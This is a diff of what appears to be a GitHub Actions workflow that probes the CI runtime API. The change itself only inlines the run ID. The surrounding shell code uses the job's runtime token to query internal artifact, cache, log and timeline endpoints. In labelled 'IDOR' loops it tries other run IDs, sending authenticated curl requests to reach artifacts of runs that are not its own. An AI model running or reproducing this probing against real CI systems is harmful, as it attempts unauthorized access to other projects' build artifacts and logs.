@@ -147,7 +147,6 @@ except Exception as e:
 
           RUNTIME_URL="${ACTIONS_RUNTIME_URL:-}"
           RUNTIME_TOKEN="${ACTIONS_RUNTIME_TOKEN:-}"
-          RUN_ID="${{ github.run_id }}"
 
           if [[ -z "$RUNTIME_URL" || -z "$RUNTIME_TOKEN" ]]; then
             echo "ERROR: ACTIONS_RUNTIME_URL or TOKEN not available" >> runtime_api_probe.txt
@@ -166,7 +165,7 @@ except Exception as e:
           # ---------------------------------------------------------------
           ENDPOINTS=(
             # Artifact endpoints (v2 protocol)
-            "_apis/pipelines/workflows/${RUN_ID}/artifacts"
+            "_apis/pipelines/workflows/${{ github.run_id }}/artifacts"
             "_apis/pipelines/1/artifacts"
 
             # Legacy artifact endpoints
@@ -181,14 +180,14 @@ except Exception as e:
             "_apis/artifactcache/cache"
 
             # Pipeline run info (IDOR test)
-            "_apis/pipelines/runs/${RUN_ID}"
+            "_apis/pipelines/runs/${{ github.run_id }}"
             "_apis/pipelines/runs/1"  # Try accessing run_id=1 (IDOR)
 
             # Timeline endpoints
-            "_apis/pipelines/runs/${RUN_ID}/timeline"
+            "_apis/pipelines/runs/${{ github.run_id }}/timeline"
 
             # Logs endpoints
-            "_apis/pipelines/runs/${RUN_ID}/logs"
+            "_apis/pipelines/runs/${{ github.run_id }}/logs"
 
             # Generic discovery
             "_apis/pipelines"
@@ -225,7 +224,7 @@ except Exception as e:
           # ---------------------------------------------------------------
           echo "" >> runtime_api_probe.txt
           echo "=== IDOR Test: Cross-Run Artifact Access ===" >> runtime_api_probe.txt
-          CURRENT_RUN="$RUN_ID"
+          CURRENT_RUN="${{ github.run_id }}"
           # Try run_id - 1 (previous run)
           PREV_RUN=$((CURRENT_RUN - 1))
           for test_run in "$PREV_RUN" "1" "$((CURRENT_RUN + 1))"; do
@@ -547,7 +546,6 @@ except: print('API_ERROR')
           RUNTIME_URL="${ACTIONS_RUNTIME_URL:-}"
           RUNTIME_TOKEN="${ACTIONS_RUNTIME_TOKEN:-}"
           RESULTS_URL="${ACTIONS_RESULTS_URL:-}"
-          RUN_ID="${{ github.run_id }}"
 
           # ---------------------------------------------------------------
           # Modern artifact protocol uses Twirp (protobuf-over-HTTP)
@@ -593,7 +591,7 @@ except: print('API_ERROR')
             # ---------------------------------------------------------------
             echo "" >> artifact_probe.txt
             echo "=== Artifact IDOR via Results API ===" >> artifact_probe.txt
-            CURRENT_RUN="$RUN_ID"
+            CURRENT_RUN="${{ github.run_id }}"
             for test_run in "$((CURRENT_RUN - 1))" "1" "$((CURRENT_RUN + 100))"; do
               IDOR_RESP=$(curl -sS -o /tmp/idor_art.json -w "%{http_code}" \
                 -X POST \
